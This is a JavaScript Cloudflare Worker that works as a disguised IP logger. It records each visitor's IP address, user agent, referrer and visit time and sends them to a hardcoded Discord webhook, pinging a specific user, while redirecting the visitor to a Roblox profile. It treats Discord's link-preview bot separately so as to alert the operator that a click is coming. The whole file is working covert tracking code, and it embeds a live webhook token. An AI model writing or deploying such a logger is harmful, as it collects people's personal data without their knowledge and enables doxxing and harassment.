export default {
  async fetch(request, env, ctx) {
    // Get visitor IP information
    const cfConnectingIP = request.headers.get('CF-Connecting-IP') || 'Unknown IP'
    const xRealIP = request.headers.get('X-Real-IP') || 'Unknown'
    
    const userAgent = request.headers.get('User-Agent') || 'Unknown'
    const referer = request.headers.get('Referer') || 'Direct visit'
    const time = new Date().toLocaleString()
    
    // Check if the request is from Discord's bot
    const isDiscordBot = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com')
    
    // Check if user agent is unknown
    const isUnknownAgent = userAgent === 'Unknown' || userAgent.trim() === ''
    
    // Create different embed based on the request type
    let embedData;
    
    if (isDiscordBot) {
      // Simpler notification for Discord bot
      embedData = {
        content: "<@852641530073317376>", // Add the user ping here
        embeds: [{
          title: "Link was sent somewhere in a chat",
          color: 3447003, // Discord blue color
          footer: { text: "Expect an ip soon" }
        }]
      }
    } else if (isUnknownAgent) {
      // Special notification for unknown user agents
      embedData = {
        content: "<@852641530073317376>", // Add the user ping here
        embeds: [{
          title: "Discord monkey agent tried accessing link",
          color: 15158332, // Red color
          description: `\`\`\`IP: ${cfConnectingIP}\nTime: ${time}\`\`\``,
          footer: { text: "Suspicious Access Detected" }
        }]
      }
    } else {
      // Format IP information in a tree-branch style
      const ipTreeFormat = `
└─── IP Information
    ├─── CF-Connecting-IP: ${cfConnectingIP}
    └─── X-Real-IP: ${xRealIP}
`;
      
      // Format other information in a tree-branch style
      const otherInfoFormat = `
└─── Request Details
    ├─── User Agent: ${userAgent}
    ├─── Referrer: ${referer}
    └─── Time: ${time}
`;
      
      // Full notification for real visitors with tree-branch design
      embedData = {
        embeds: [{
          title: "New Visitor Detected",
          color: 5814783,
          description: `\`\`\`${ipTreeFormat}${otherInfoFormat}\`\`\``,
          footer: { text: "Advanced IP Logger" }
        }]
      }
    }

    // Send data to Discord webhook
    await fetch('https://discord.com/api/webhooks/1378865978284441660/7qp-LF0HGRBDHu6vWeKcN4TbclsMuMb1hvjSswcHNa41-Af9rWU-mkFIoS2TE0LDbyUg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embedData)
    }).catch(err => {
      // Handle errors silently
      console.error('Error sending webhook:', err)
    })

    // Redirect visitor to Roblox profile
    return Response.redirect('https://www.roblox.com/users/4598039640/profile', 302)
  }
}